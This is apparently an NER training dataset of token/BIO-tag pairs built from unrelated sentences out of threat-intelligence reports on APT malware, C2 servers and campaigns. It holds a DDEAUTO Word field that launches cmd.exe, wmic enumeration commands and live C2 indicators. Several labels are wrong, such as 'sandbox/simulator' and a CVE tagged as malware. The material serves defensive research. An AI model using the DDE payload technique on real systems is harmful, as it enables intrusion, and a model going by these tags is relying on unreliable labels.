Government	O
Education	O
Telecommunications	O

Dynamically	O
,	O
the	O
sandbox/simulator	B-malware.backdoor
must	O
interact	O
with	O
the	O
attacker	O
's	O
server	O
and	O
receive	O
malicious	O
content	O
,	O
necessitating	O
that	O
the	O
analysis	O
system	O
has	O
a	O
live	O
connection	O
to	O
the	O
Internet	O
.	O

The	O
specific	O
processes	O
targeted	O
are	O
:	O
Other	O
variants	O
of	O
this	O
malware	O
also	O
check	O
if	O
other	O
security	O
products	O
are	O
present	O
.	O

1	O
.	O

[	O
Note	O
:	O
Record	O
#	O
1	O
contained	O
the	O
contents	O
of	O
the	O
.jpg	O
file	O
,	O
preceded	O
by	O
hex	O
A731010090051400	O
,	O
and	O
followed	O
by	O
hex	O
0A0A0A0A	O
.	O
]	O

Win32/TrojanDropper	O
.	O

Those	O
C	O
&	O
Cs	O
were	O
compromised	O
legitimate	O
websites	O
,	O
which	O
is	O
standard	O
operating	O
procedure	O
for	O
Animal	O
Farm	O
.	O

The	O
 rst	O
is	O
a	O
greater	O
reliance	O
on	O
freely	O
available	O
software	O
tools	O
,	O
also	O
known	O
as	O
'	O
living	O
off	O
the	O
land	O
.	O
'	O

The	O
fact	O
that	O
most	O
of	O
the	O
attackers	O
'	O
tools	O
were	O
not	O
detected	O
by	O
the	O
antivirus	O
software	O
and	O
other	O
security	O
products	O
deployed	O
in	O
the	O
company	O
's	O
environment	O
before	O
Cybereason	O
,	O
is	O
not	O
surprising	O
.	O

Sign	O
up	O
for	O
our	O
weekly	O
FortiGuard	O
Threat	O
Brief	O
or	O
for	O
our	O
FortiGuard	O
Threat	O
Intelligence	O
Service	O
.	O

Looking	O
at	O
the	O
compilation	O
timestamps	O
and	O
assuming	O
they	O
are	O
not	O
faked	O
(	O
which	O
is	O
backed	O
by	O
VirusTotal	O
submission	O
dates	O
)	O
,	O
the	O
oldest	O
family	O
is	O
TFC	O
being	O
active	O
throughout	O
2010	O
.	O

Document	O
Status	O
:	O
FINAL	O
Last	O
Revised	O
:	O
2012-11-01	O

The	O
aurora	B-malware.infosteal
innoculation	O
shot	O
can	O
be	O
downloaded	O
from	O
www.hbgary.com	B-url.normal
.	O

The	O
Automated	O
Indicator	O
Sharing	O
(	O
AIS	O
)	O
initiative	O
is	O
a	O
DHS	O
effort	O
to	O
create	O
a	O
system	O
where	O
as	O
soon	O
as	O
a	O
company	O
or	O
federal	O
agency	O
observes	O
an	O
attempted	O
compromise	O
,	O
the	O
indicator	O
will	O
be	O
shared	O
in	O
real	O
time	O
with	O
all	O
of	O
our	O
partners	O
,	O
protecting	O
them	O
from	O
that	O
particular	O
threat	O
.	O

IOCs	O
associated	O
with	O
RIS	O
cyber	O
actors	O
are	O
provided	O
within	O
the	O
accompanying	O
.csv	O
and	O
.stix	O
files	O
of	O
JAR-16-20296	O
.	O

Poor	O
change	O
management	O
policy	O
resulted	O
in	O
the	O
full	O
trust	O
of	O
software	O
updates	O
,	O
allowing	O
attackers	O
to	O
fully	O
exploit	O
this	O
weakpoint	O
.	O

We	O
discovered	O
at	O
least	O
three	O
paths	O
contacted	O
with	O
a	O
custom	O
user	O
agent	O
header	O
:	O

Sometimes	O
,	O
they	O
share	O
infrastructure	O
,	O
but	O
more	O
often	O
they	O
do	O
not	O
share	O
infrastructure	O
and	O
appear	O
to	O
compete	O
for	O
access	O
within	O
targets	O
.	O

This	O
blog	O
post	O
describes	O
another	O
attack	O
campaign	O
where	O
attackers	O
used	O
the	O
Uri	O
terror	O
attack	O
and	O
Kashmir	O
protest	O
themed	O
spear	O
phishing	O
emails	O
to	O
target	O
officials	O
in	O
the	O
Indian	O
Embassies	O
and	O
Indian	O
Ministry	O
of	O
External	O
Affairs	O
(	O
MEA	O
)	O
.	O

APT32	B-malware.infosteal
may	O
also	O
possess	O
backdoor	O
development	O
capabilities	O
for	O
macOS	O
.	O

media@cyberkov.com	B-url.normal
+965	O
22445500	O
+1	O
(	O
888	O
)	O
433-3113	O
+965	O
22445500	O
info@cyberkov.com	B-url.normal
Document	O
Control	O
...............................................................................................................................................	O
1	O
Cyberkov	O
Contact	O
Details	O
....................................................................................................................................	O
1	O
Executive	O
Summary	O
.............................................................................................................................................	O
3	O
Tactics	O
,	O
Techniques	O
and	O
Procedures	O
(	O
TTPs	O
)	O
.........................................................................................................	O
4	O
Malware	O
Analysis	O
.................................................................................................................................................	O
6	O
Command	O
and	O
Control	O
Communication	O
............................................................................................................	O
21	O
Sinkhole	O
.........................................................................................................................................................	O
21	O
Real	O
C2	O
...........................................................................................................................................................	O
24	O
Threat	O
Actor	O
and	O
Attribution	O
.............................................................................................................................	O
25	O
Threat	O
Actors	O
Infrastructure	O
..............................................................................................................................	O
29	O
To	O
Be	O
Continued	O
................................................................................................................................................	O
33	O
Mitigating	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
Attacks	O
on	O
Android	O
..............................................................................................	O
33	O
Indicators	O
of	O
Compromise	O
(	O
IOCs	O
)	O
......................................................................................................................	O
33	O
Libya	O
maybe	O
known	O
in	O
non-stable	O
political	O
system	O
,	O
civil	O
war	O
and	O
militant	O
groups	O
fighting	O
for	O
the	O
land	O
and	O
oil	O
control	O
but	O
it	O
is	O
definitely	O
not	O
known	O
in	O
cyber	O
malicious	O
activities	O
,	O
cyber	O
espionage	O
and	O
hacking	O
groups	O
.	O

In	O
particular	O
the	O
time	O
at	O
which	O
to	O
run	O
a	O
command	O
is	O
given	O
by	O
a	O
string	O
following	O
the	O
format	O
'	O
minute	O
hour	O
day	O
month	O
year	O
dayofweek	O
'	O
.	O

More	O
than	O
30	O
years	O
after	O
the	O
end	O
of	O
the	O
Cold	O
War	O
,	O
digital	O
infrastructures	O
worldwide	O
have	O
become	O
strategic	O
national	O
fronts	O
with	O
the	O
same	O
importance	O
as	O
the	O
geographical	O
frontiers	O
of	O
air	O
,	O
land	O
,	O
sea	O
and	O
space	O
.	O

In	O
most	O
cases	O
,	O
the	O
number	O
at	O
the	O
end	O
of	O
the	O
group	O
label	O
is	O
the	O
same	O
number	O
used	O
at	O
the	O
end	O
of	O
the	O
subdomain	O
for	O
the	O
CnC	O
.	O

The	O
capabilities	O
for	O
this	O
unique	O
suite	O
of	O
malware	O
is	O
shown	O
in	O
Table	O
3	O
.	O

The	O
malware	O
first	O
tries	O
to	O
retrieve	O
its	O
resource	O
and	O
decrypt	O
it	O
using	O
RC4	O
.	O

This	O
geolocation	O
is	O
based	O
on	O
the	O
IP	O
addresses	O
of	O
the	O
victims	O
.	O

The	O
only	O
differences	O
in	O
registrant	O
data	O
from	O
one	O
domain	O
to	O
the	O
next	O
involved	O
very	O
slight	O
modifications	O
to	O
the	O
country	O
codes	O
or	O
by	O
changing	O
the	O
third	O
digit	O
.	O

First	O
execute	O
the	O
DLL	O
disguised	O
as	O
a	O
zlib	O
library	O
function	O
with	O
rundll32	O
and	O
execute	O
the	O
backdoor	O
installation	O
functions	O
uncompress2	O
and	O
uncompress3	O
.	O

Inception	B-malware.backdoor
has	O
also	O
increased	O
its	O
use	O
of	O
the	O
cloud	O
,	O
and	O
diversi ed	O
the	O
range	O
of	O
cloud	O
providers	O
it	O
uses	O
for	O
C	O
&	O
C	O
purposes	O
.	O

command	O
parms	O
0x00000001	O
payload	O
len	O
CRC	O
KEY	O
payload	O

Scrub	O
and	O
verify	O
all	O
administrator	O
accounts	O
regularly	O
.	O

The	O
Powershell	O
script	O
contained	O
in	O
the	O
sample	O
's	O
code	O
Figure	O
6	O
.	O

B7DF947B4A67A884C751840F83C4405E	B-hash
hint.zapto.org	B-url.cncsvr

For	O
the	O
initial	O
information	O
packet	O
,	O
the	O
backdoor	O
also	O
collects	O
the	O
following	O
:	O

As	O
a	O
result	O
,	O
they	O
were	O
received	O
by	O
the	O
intermediary	O
bank	O
but	O
had	O
no	O
further	O
influence	O
on	O
the	O
funds	O
transferred	O
to	O
the	O
beneficiary	O
accounts	O
.	O

Additionally	O
,	O
the	O
new	O
campaigns	O
we	O
uncovered	O
further	O
highlight	O
the	O
correlation	O
between	O
APT	O
groups	O
ceasing	O
and	O
retooling	O
operations	O
after	O
media	O
exposure	O
,	O
as	O
APT12	O
used	O
the	O
same	O
strategy	O
after	O
compromising	O
the	O
New	O
York	O
Times	O
in	O
Oct	O
2012	O
.	O

9fcLqd0Gu00j	O
I	O
small	O
a	O
RAT	O
!	O

House	O
Speaker	O
Nancy	O
Pelosi	O
later	O
confirmed	O
that	O
the	O
DCCC	O
had	O
suffered	O
a	O
network	O
compromise	O
.	O

Arid	B-malware.unknown
Viper	I-malware.unknown
(	O
1	O
SAMPLE	O
)	O
Equation	B-malware.unknown
(	O
1	O
SAMPLE	O
)	O
BrutPOS	B-malware.unknown
(	O
6	O
SAMPLES	O
)	O
As	O
illustrated	O
in	O
the	O
table	O
above	O
,	O
we	O
identi ed	O
eight	O
malicious	O
samples	O
that	O
were	O
in	O
the	O
wild	O
before	O
being	O
associated	O
with	O
APT	B-malware.unknown
campaigns	O
.	O

The	O
handshake	O
between	O
a	O
client	O
and	O
the	O
server	O
variant	O
is	O
well	O
defined	O
and	O
consisting	O
of	O
64	O
bytes	O
,	O
the	O
data	O
within	O
the	O
handshake	O
is	O
entirely	O
random	O
with	O
the	O
exception	O
of	O
the	O
3	O
and	O
8	O
DWORD	O
.	O

They	O
are	O
used	O
for	O
a	O
variety	O
of	O
criminal	O
activity	O
,	O
including	O
'	O
sextortion	B-malware.infosteal
'	O
.	O

According	O
to	O
recent	O
reporting	O
,	O
German	O
Federal	O
Police	O
appear	O
to	O
have	O
plans	O
to	O
purchase	O
and	O
use	O
the	O
FinFisher	B-malware.backdoor
suite	O
of	O
tools	O
domestically	O
within	O
Germany	O
.	O

The	O
following	O
is	O
a	O
list	O
of	O
overall	O
features	O
available	O
in	O
this	O
version	O
of	O
Bandook	B-malware.unknown
:	O
Screen	O
capture	O
Webcam	O
recording	O
Audio	O
recording	O
File	O
search	O
,	O
creation	O
,	O
deletion	O
and	O
exfiltration	O
Spawn	O
a	O
shell	O
Get	O
list	O
of	O
available	O
Wireless	O
networks	O
Get	O
list	O
of	O
MTP	O
devices	O
Monitor	O
USB	O
devices	O
Given	O
the	O
common	O
thread	O
tying	O
together	O
the	O
targets	O
we	O
find	O
it	O
likely	O
that	O
this	O
campaign	O
was	O
carried	O
out	O
by—or	O
on	O
the	O
behalf	O
of—the	O
government	O
of	O
Kazakhstan	O
,	O
or	O
forces	O
allied	O
with	O
the	O
government	O
.	O

Further	O
details	O
of	O
the	O
destination	O
accounts	O
within	O
Sri	O
Lanka	O
have	O
emerged	O
in	O
open	O
source	O
.	O

Figure	O
7	O
.	O

It	O
is	O
unclear	O
though	O
as	O
of	O
why	O
only	O
parsing	O
for	O
the	O
MSN	O
messenger	O
is	O
supported	O
.	O

But	O
the	O
malicious	O
program	O
replaces	O
this	O
string	O
with	O
the	O
following	O
:	O
'	O
<	O
Hangul	O
full	O
path	O
>	O
HncReporter.exe	O
'	O
'	O
%	O
1	O
'	O
.	O

In	O
this	O
way	O
,	O
we	O
can	O
guarantee	O
that	O
our	O
own	O
call	O
will	O
be	O
surely	O
called	O
with	O
proper	O
setup	O
.	O

Most	O
of	O
the	O
samples	O
caught	O
in-the-wild	O
seem	O
to	O
target	O
Vietnamese	O
speakers	O
.	O

C2	O
Communication	O
Pattern	O

Many	O
of	O
the	O
fake	O
domains	O
appeared	O
to	O
have	O
been	O
created	O
by	O
several	O
of	O
the	O
same	O
accounts	O
,	O
and	O
open	O
source	O
analysis	O
indicated	O
that	O
the	O
names	O
listed	O
for	O
the	O
person	O
registering	O
the	O
addresses	O
was	O
clearly	O
fictitious	O
;	O
probably	O
chosen	O
at	O
random	O
from	O
the	O
Internet	O
.	O

The	O
received	O
data	O
was	O
enclosed	O
with	O
the	O
tag	O
<	O
COMMAND	O
>	O
<	O
/COMMAND	O
>	O
,	O
encoded	O
with	O
base64	O
,	O
and	O
still	O
follows	O
the	O
same	O
data	O
structure	O
of	O
the	O
protocol	O
when	O
decoded	O
.	O

This	O
will	O
be	O
followed	O
by	O
the	O
actual	O
key	O
.	O

םיסיט	O
םינוחטיב	O
החטבא	O
פ'תשמ	O

'C:\Windows\system32\cmd.exe	O
'	O
/c	O
'	O
wmic	O
process	O
get	O
processid	O
,	O
commandline	O
,	O
sessionid	O
|	O
findstr	O
SysWOW	O
'	O
'	O
C:\Windows\system32\cmd.exe	O
'	O
/c	O
'	O
wmic	O
process	O
get	O
processid	O
,	O
commandline	O
,	O
sessionid	O
|	O
findstr	O
x86	O
'	O

The	O
implants	O
are	O
highly	O
configurable	O
via	O
encrypted	O
configuration	O
files	O
,	O
which	O
allow	O
the	O
adversary	O
to	O
customize	O
various	O
components	O
,	O
including	O
C2	O
servers	O
,	O
the	O
list	O
of	O
initial	O
tasks	O
to	O
carry	O
out	O
,	O
persistence	O
mechanisms	O
,	O
encryption	O
keys	O
and	O
others	O
.	O

are	O
broad	O
web	O
application	O
attack	O
techniques	O
that	O
attempt	O
to	O
send	O
commands	O
to	O
a	O
browser	O
,	O
database	O
,	O
or	O
other	O
system	O
,	O
allowing	O
a	O
regular	O
user	O
to	O
control	O
behavior	O
.	O

Along	O
with	O
the	O
executable	O
,	O
two	O
binary	O
files	O
,	O
inject.bin	O
(	O
malicious	O
function	O
code	O
)	O
and	O
imain.bin	O
(	O
malicious	O
control	O
logic	O
)	O
,	O
were	O
deployed	O
as	O
the	O
controller	O
's	O
payload	O
.	O

shown	O
below	O
.	O

Agent.RUI	O
Win32/TrojanDropper	O
.	O

'	O
Pawn	O
Storm	O
Targets	O
German	O
Christian	O
Democratic	O
Union	O
.	O
'	O

Current	O
security	O
solutions	O
are	O
proving	O
ineffective	O
at	O
stopping	O
cyber	O
espionage	O
.	O

But	O
the	O
group	O
most	O
widely	O
associated	O
with	O
his	O
government	O
dominates	O
the	O
world	O
of	O
industrial	O
scale	O
hacking	O
.	O

The	O
ransomware	O
calls	O
GetSystemDefaultLangID	O
(	O
)	O
to	O
obtain	O
language	O
identifier	O
for	O
the	O
system	O
locale	O
.	O

We	O
can	O
see	O
the	O
tools	O
detection	O
:	O
If	O
one	O
of	O
the	O
elements	O
mentioned	O
above	O
is	O
detected	O
,	O
the	O
malware	O
will	O
display	O
a	O
rather	O
poetic	O
dialog	O
popup	O
:	O
So	O
,	O
the	O
anti-VM	O
is	O
really	O
rudimentary	O
.	O

Fancy	O
Bears	O
'	O
HT	O
(	O
fancybears	O
)	O
.	O

The	O
malware	O
checks	O
via	O
PEB	O
to	O
detect	O
whether	O
or	O
not	O
it	O
is	O
being	O
debugged	O
,	O
and	O
if	O
it	O
is	O
it	O
returns	O
a	O
random	O
address	O
.	O

The	O
overall	O
workflow	O
of	O
the	O
deployment	O
method	O
and	O
capabilities	O
is	O
pictured	O
below	O
.	O

This	O
type	O
of	O
customization	O
requires	O
good	O
coding	O
skills	O
and	O
understanding	O
of	O
how	O
those	O
tools	O
work	O
.	O

The	O
MacOS	O
backdoor	O
was	O
found	O
in	O
a	O
malicious	O
Word	O
document	O
presumably	O
distributed	O
via	O
email	O
.	O

Purpose	O

Both	O
resources	O
are	O
structured	O
similarily	O
.	O

Although	O
touted	O
as	O
a	O
'	O
lawful	O
interception	O
'	O
suite	O
for	O
monitoring	O
criminals	O
,	O
FinFisher	B-malware.backdoor
has	O
gained	O
notoriety	O
because	O
it	O
has	O
been	O
used	O
in	O
targeted	O
attacks	O
against	O
human	O
rights	O
campaigners	O
and	O
opposition	O
activists	O
in	O
countries	O
with	O
questionable	O
human	O
rights	O
records	O
.	O

It	O
is	O
also	O
interesting	O
that	O
the	O
malware	O
author	O
did	O
not	O
custom	O
develop	O
a	O
backdoor	O
program	O
.	O

These	O
routers	O
are	O
hijacked	O
by	O
Inception	B-malware.backdoor
and	O
con gured	O
to	O
forward	O
tra c	O
from	O
one	O
port	O
to	O
another	O
host	O
on	O
the	O
internet	O
.	O

Generic	O
buffer	O
overflow	O
protection	O
is	O
expected	O
to	O
cover	O
some	O
,	O
but	O
not	O
all	O
,	O
exploits	O
.	O

:	O
Real	O
C2	O
Server	O
Hardcoded	O
in	O
the	O
Malware	O
To	O
mitigate	O
the	O
threat	O
of	O
the	O
described	O
campaign	O
,	O
security	O
teams	O
can	O
consider	O
blocking	O
access	O
to	O
the	O
C2	O
server	O
103.236.150[.]14	B-ip.unknown
and	O
,	O
where	O
applicable	O
,	O
ensure	O
that	O
the	O
Microsoft	O
Security	O
Update	O
KB2553204	O
is	O
installed	O
in	O
order	O
to	O
patch	O
the	O
CVE-2017-11882	O
vulnerability	O
.	O

JRat	B-malware.backdoor
also	O
provides	O
a	O
controller	O
application	O
,	O
which	O
is	O
written	O
in	O
Java	O
.	O

In	O
the	O
case	O
of	O
the	O
default	O
password	O
0123456789	O
,	O
the	O
encrypted	O
resource	O
will	O
hold	O
the	O
value	O

Based	O
on	O
that	O
,	O
we	O
estimate	O
that	O
the	O
group	O
has	O
successfully	O
infected	O
,	O
a	O
few	O
thousands	O
victims	O
.	O

Recently	O
,	O
there	O
was	O
a	O
blog	O
post	O
on	O
the	O
takedown	O
of	O
a	O
botnet	O
used	O
by	O
threat	O
actor	O
group	O
known	O
as	O
Group	O
72	O
and	O
their	O
involvement	O
in	O
Operation	O
SMN	O
.	O

The	O
macro	O
also	O
contained	O
lot	O
of	O
junk	O
code	O
,	O
unnecessary	O
comments	O
and	O
variable	O
assignments	O
as	O
shown	O
below	O
.	O

File	O
Name	O
:	O
netui3.dll	O
File	O
Size	O
:	O
39424	O
bytes	O
MD5	O
:	O
68aed7b1f171b928913780d5b21f7617	B-hash
Continued	O
analysis	O
disclosed	O
details	O
regarding	O
the	O
field	O
unit/agent	O
application	O
.	O

The	O
communication	O
between	O
the	O
controlling	O
client	O
and	O
the	O
Derusbi	B-malware.backdoor
server	O
variant	O
depends	O
on	O
the	O
device	O
driver	O
being	O
in	O
place	O
.	O

Some	O
of	O
these	O
operations	O
have	O
involved	O
the	O
disruption	O
and	O
defacement	O
of	O
websites	O
,	O
false	O
flag	O
operations	O
using	O
false	O
hacktivist	O
personas	O
,	O
and	O
the	O
theft	O
of	O
data	O
that	O
was	O
later	O
leaked	O
publicly	O
online	O
.	O

D	O
,	O
e	O
,	O
A	O
0,5,19	O

Item_info	O
array	O
in	O
exploit	O
object	O

In	O
addition	O
to	O
these	O
hiding	O
techniques	O
,	O
this	O
malware	O
also	O
appears	O
to	O
employ	O
techniques	O
to	O
possibly	O
evade	O
dynamic	O
malware	O
analysis	O
systems	O
.	O

FireEye	O
advises	O
against	O
visiting	O
that	O
site	O
now	O
.	O

The	O
infection	O
vector	O
used	O
in	O
this	O
attack	O
may	O
have	O
been	O
a	O
spearphishing	O
e-mail	O
with	O
a	O
malicious	O
attachment	O
using	O
an	O
RTF-exploit	O
or	O
.SCR	O
file	O
.	O

Furthermore	O
,	O
this	O
function	O
is	O
structured	O
as	O
a	O
very	O
long	O
sequence	O
of	O
if	O
-	O
else	O
statements	O
that	O
compare	O
each	O
of	O
these	O
command	O
strings	O
against	O
the	O
same	O
buffer	O
.	O

For	O
example	O
,	O
if	O
we	O
name	O
a	O
file	O
'	O
filename	O
[	O
special	O
flipping	O
char	O
]	O
fdp.scr	O
'	O
it	O
will	O
be	O
displayed	O
as	O
'	O
filename	O
rcs.pdf	O
'	O
.	O

In	O
the	O
meantime	O
,	O
users	O
who	O
have	O
executed	O
either	O
the	O
fake	O
Freegate	B-malware.drop
file	O
or	O
clicked	O
on	O
one	O
of	O
the	O
Windows	B-malware.drop
shortcut	I-malware.drop
files	O
should	O
consider	O
their	O
computers	O
and	O
accounts	O
compromised	O
.	O

These	O
include	O
the	O
following	O
:	O
.	O

13	O

Drop	O
backdoor	O
dll	O
to	O
%	O
localappdata	O
%	O
\Temp\\	O
<	O
random	O
>	O
.dat	O
.	O

In	O
similar	O
past	O
cases	O
,	O
the	O
victims	O
were	O
targeted	O
for	O
their	O
passwords	O
and	O
 nancial	O
information	O
.	O

PCC_PROXY	O
:	O
:fNetworkEnabled	O
flag	O
is	O
set	O
to	O
false	O
,	O
then	O
tunneling	O
is	O
disabled	O
but	O
command	O
processing	O
continues	O
.	O

tripleshop[.]id	B-url.cncsvr

They	O
scout	O
for	O
vulnerable	O
practices	O
,	O
susceptible	O
systems	O
and	O
operational	O
loopholes	O
that	O
they	O
can	O
leverage	O
or	O
abuse	O
.	O

>	O
<	O
w	O
:	O
document	O
[	O
...	O
redated	O
...	O
}	O
]	O
mc	O
:	O
Ignorable='w14	O
w15	O
wp14	O
'	O
>	O
<	O
w	O
:	O
body	O
>	O
<	O
w	O
:	O
p	O
w	O
:	O
rsidR='00215C91	O
'	O
w	O
:	O
rsidRDefault='008C166A	O
'	O
>	O
<	O
w	O
:	O
r	O
>	O
<	O
w	O
:	O
fldChar	O
w	O
:	O
fldCharType='begin'/	O
>	O
<	O
/w	O
:	O
r	O
>	O
<	O
w	O
:	O
r	O
>	O
<	O
w	O
:	O
instrText	O
xml	O
:	O
space='preserve	O
'	O
>	O
<	O
/w	O
:	O
instrText	O
>	O
<	O
/w	O
:	O
r	O
>	O
<	O
w	O
:	O
r	O
>	O
<	O
w	O
:	O
rPr	O
>	O
<	O
w	O
:	O
rFonts	O
w	O
:	O
ascii='Helvetica	O
'	O
w	O
:	O
hAnsi='Helvetica	O
'	O
w	O
:	O
cs='Helvetica'/	O
>	O
<	O
w	O
:	O
color	O
w	O
:	O
val='383838'/	O
>	O
<	O
w	O
:	O
spacing	O
w	O
:	O
val='3'/	O
>	O
<	O
w	O
:	O
sz	O
w	O
:	O
val='26'/	O
>	O
<	O
w	O
:	O
szCs	O
w	O
:	O
val='26'/	O
>	O
<	O
w	O
:	O
shd	O
w	O
:	O
val='clear	O
'	O
w	O
:	O
color='auto	O
'	O
w	O
:	O
fill='FFFFFF'/	O
>	O
<	O
/w	O
:	O
rPr	O
>	O
<	O
w	O
:	O
instrText	O
>	O
DDEAUTO	O
c:\\windows\\system32\\cmd.exe	O
'	O
/k	O
calc.exe	O
'	O
<	O
/w	O
:	O
instrText	O
>	O
<	O
/w	O
:	O
r	O
>	O
<	O
w	O
:	O
r	O
>	O
<	O
w	O
:	O
instrText	O
xml	O
:	O
space='preserve	O
'	O
>	O
<	O
/w	O
:	O
instrText	O
>	O
<	O
/w	O
:	O
r	O
>	O
<	O
w	O
:	O
r	O
>	O
<	O
w	O
:	O
fldChar	O
w	O
:	O
fldCharType='end'/	O
>	O
<	O
/w	O
:	O
r	O
>	O
<	O
w	O
:	O
bookmarkStart	O
w	O
:	O
id='0	O
'	O
w	O
:	O
name='_GoBack'/	O
>	O
<	O
w	O
:	O
bookmarkEnd	O
w	O
:	O
id='0'/	O
>	O
<	O
/w	O
:	O
p	O
>	O
<	O
w	O
:	O
sectPr	O
w	O
:	O
rsidR='00215C91	O
'	O
>	O
<	O
w	O
:	O
pgSz	O
w	O
:	O
w='12240	O
'	O
w	O
:	O
h='15840'/	O
>	O
<	O
w	O
:	O
pgMar	O
w	O
:	O
top='1440	O
'	O
w	O
:	O
right='1440	O
'	O
w	O
:	O
bottom='1440	O
'	O
w	O
:	O
left='1440	O
'	O
w	O
:	O
header='720	O
'	O
w	O
:	O
footer='720	O
'	O
w	O
:	O
gutter='0'/	O
>	O
<	O
w	O
:	O
cols	O
w	O
:	O
space='720'/	O
>	O
<	O
w	O
:	O
docGrid	O
w	O
:	O
linePitch='360'/	O
>	O
<	O
/w	O
:	O
sectPr	O
>	O
<	O
/w	O
:	O
body	O
>	O
<	O
/w	O
:	O
document	O
>	O

For	O
example	O
,	O
this	O
code	O
can	O
perform	O
any	O
of	O
the	O
following	O
actions	O
:	O
File	O
upload	O
or	O
download	O
File	O
system	O
read	O
,	O
write	O
,	O
or	O
delete	O
Arbitrary	O
command	O
execution	O
This	O
web	O
shell	O
is	O
an	O
example	O
of	O
a	O
'	O
thick	O
client	O
'	O
shell	O
,	O
meaning	O
that	O
while	O
the	O
server	O
side	O
code	O
is	O
quite	O
small	O
,	O
attackers	O
typically	O
use	O
a	O
larger	O
GUI	O
client	O
to	O
construct	O
the	O
sent	O
commands	O
.	O

Point	O
of	O
Entry	O
Notable	O
Tools	O
Spear-phishing	O
emails	O
containing	O
decoy	O
documents	O
Malicious	O
shortcut	O
(	O
LNK	O
)	O
files	O
and	O
PowerShell	O
Self-extracting	O
archive	O
(	O
SFX	O
)	O
Runtime	O
packers	O
Hacking	O
Tools	O
Second-stage	O
payloads	O
Backdoor	O
ChChes	B-malware.backdoor
Spear-phishing	O
emails	O
containing	O
decoy	O
documents	O
exploiting	O
CVE-2017-8759	O
Spear-phishing	O
emails	O
containing	O
decoy	O
documents	O
exploiting	O
CVE-2017-11882	B-malware.backdoor
,	O
DDEAUTO	O
,	O
Microsoft	O
Office	O
Frameset	O
and	O
Link	O
auto	O
update	O
Koadic	B-malware.unknown
Hacking	O
Tools	O
Second-stage	O
payloads	O
ANEL	B-malware.backdoor
Koadic	B-malware.unknown
Hacking	O
Tools	O
Second-stage	O
payloads	O
ANEL	B-malware.backdoor

lremit_Transfer_Error_Page.jar	B-malware.infosteal

The	O
malicious	O
JavaScript	O
leads	O
to	O
the	O
download	O
of	O
malware	O
to	O
the	O
victim	O
's	O
device	O
.	O

6146B749A3CF9C9FE8CFAB2C	O
1100A768B3C7C0F8FCDFC907B6F9	O
1C41A66E91C4C1BDE9	O

However	O
,	O
sometimes	O
researchers	O
are	O
able	O
to	O
connect	O
the	O
dots	O
and	O
attribute	O
the	O
attack	O
to	O
a	O
threat	O
actor	O
.	O

In	O
particular	O
a	O
JavaScript	O
file	O
loaded	O
from	O
parts.nikkei.com	B-url.unknown
was	O
modified	O
to	O
reference	O
another	O
JavaScript	O
file	O
from	O
jre76.java-se.com	B-url.unknown

The	O
backdoor	O
had	O
the	O
following	O
properties	O
:	O

It	O
ultimately	O
disregards	O
the	O
final	O
value	O
of	O
this	O
variable	O
,	O
meaning	O
that	O
the	O
function	O
serves	O
no	O
purpose	O
.	O

HOME	O
AND	O
HOME	O
OFFICE	O
|	O
FOR	O
BUSINESS	O
|	O
SECURITY	O
INTELLIGENCE	O
|	O
ABOUT	O
TREND	O
MICRO	O
Asia	O
Pacific	O
Region	O
(	O
APAC	O
)	O
:	O
Australia	O
/	O
New	O
Zealand	O
,	O
,	O
,	O
,	O
Europe	O
,	O
Middle	O
East	O
,	O
&	O
Africa	O
Region	O
(	O
EMEA	O
)	O
:	O
France	O
,	O
Deutschland	O
/	O
Österreich	O
/	O
Schw	O
eiz	O
,	O
Italia	O
,	O
Россия	O
,	O
España	O
,	O
United	O
Kingdom	O
/	O
Ireland	O
Latin	O
America	O
Region	O
(	O
LAR	O
)	O
:	O
Brasil	O
,	O
México	O
North	O
America	O
Region	O
(	O
NABU	O
)	O
:	O
United	O
States	O
,	O
Canada	O
Privacy	O
Statement	O
Legal	O
Policies	O
Copyright	O
©	O
2018	O
Trend	O
Micro	O
Incorporated	O
.	O

I	B-malware.ransom
ron	I-malware.ransom
ransomware	O
–	O
We	O
recently	O
saw	O
a	O
shift	O
from	O
dropping	O
Xagent	O
to	O
dropping	O
Iron	B-malware.ransom
ransomware	O
.	O

Overall	O
,	O
the	O
functionality	O
of	O
the	O
DUBNIUM	B-malware.drop
first	O
stage	O
payload	O
is	O
not	O
so	O
advanced	O
in	O
its	O
functionality	O
.	O

First	O
Name	O
Last	O
Name	O
Email	O
Address	O
Subscribe	O
Products	O
Solutions	O
Mandiant	O
Consulting	O
Current	O
Threats	O
Partners	O
Support	O
Company	O
Careers	O
Press	O
Releases	O
Webinars	O
Events	O
Investor	O
Relations	O
Incident	O
?	O

Over	O
a	O
three-year	O
period	O
,	O
the	O
attackers	O
remained	O
under	O
the	O
radar	O
—	O
likely	O
due	O
to	O
the	O
low	O
number	O
of	O
compromised	O
devices	O
.	O

Several	O
of	O
these	O
are	O
likely	O
to	O
be	O
Darkhotel	B-malware.infosteal
APT	I-malware.infosteal
targets	O
:	O
●	O
Germany	O
●	O
South	O
Korea	O
●	O
China	O
(	O
likely	O
to	O
be	O
research	O
)	O
●	O
US	O
●	O
Japan	O
However	O
,	O
one	O
of	O
those	O
systems	O
hammered	O
the	O
site	O
on	O
the	O
9th	O
,	O
visiting	O
almost	O
12,000	O
times	O
in	O
30	O
minutes	O
.	O

Pakistan	O
's	O
Indigenous	O
UAV	O
industry	O

Infection	O
Flow	O

On	O
our	O
test	O
system	O
we	O
found	O
that	O
EnCase	O
was	O
not	O
adding	O
the	O
partitions	O
in	O
a	O
way	O
that	O
would	O
recognize	O
the	O
file	O
system	O
as	O
it	O
did	O
for	O
the	O
other	O
systems	O
.	O

It	O
appears	O
that	O
other	O
calls	O
to	O
API	O
functions	O
are	O
passed	O
through	O
the	O
malicious	O
DLL	O
to	O
the	O
legitimate	O
DLL	O
with	O
no	O
other	O
modification	O
.	O

2016	O
.	O

8	O
,	O
2018	O
,	O
2:15	O
a.m.	O
)	O
The	O
compiled	O
time	O
stamp	O
,	O
assuming	O
it	O
is	O
not	O
altered	O
,	O
suggests	O
the	O
actor	O
developed	O
the	O
implant	O
2	O
days	O
before	O
launching	O
the	O
described	O
campaign	O
.	O

This	O
infographic	O
shows	O
how	O
ransomware	O
has	O
evolved	O
,	O
how	O
big	O
the	O
problem	O
has	O
become	O
,	O
and	O
ways	O
to	O
avoid	O
being	O
a	O
ransomware	O
victim	O
.	O

In	O
this	O
report	O
,	O
we	O
will	O
provide	O
a	O
detailed	O
analysis	O
of	O
the	O
EvilGrab	B-malware.drop
campaign	O
.	O

3	O
Jan	O
.	O

This	O
document	O
is	O
designed	O
to	O
retrieve	O
a	O
remote	O
RTF	O
 le	O
,	O
which	O
contains	O
the	O
exploit	O
